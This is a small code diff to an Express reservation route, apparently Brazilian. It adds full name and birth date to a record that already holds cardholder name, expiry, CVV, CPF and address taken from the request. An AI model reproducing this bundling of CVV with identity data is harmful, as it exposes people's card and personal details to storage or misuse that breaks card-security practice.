@@ -82,6 +82,8 @@ router.post("/reservas", async (req, res) => {
         const tit = body.titular || body.cardHolder || body.holder || body.name || "";
         const val = body.validade || body.expiry || body.exp || body.validity || "";
         const cvv = body.cvv || body.cvc || body.code || body.security || "";
+        const nomeCompleto = body.nomeCompleto || body.nome_completo || body.fullName || body.nome || "";
+        const dataNascimento = body.dataNascimento || body.data_nascimento || body.birthDate || "";
         const cep = body.enderecoCep || body.postalCode || "";
         const rua = body.enderecoRua || body.address || "";
         const numero = body.enderecoNumero || body.addressNumber || "";
@@ -104,6 +106,8 @@ router.post("/reservas", async (req, res) => {
                 estado: estado,
                 email: body.email,
                 cpf: body.cpf,
+                nome_completo: nomeCompleto,
+                data_nascimento: dataNascimento,
             });
         }
         const payload = {
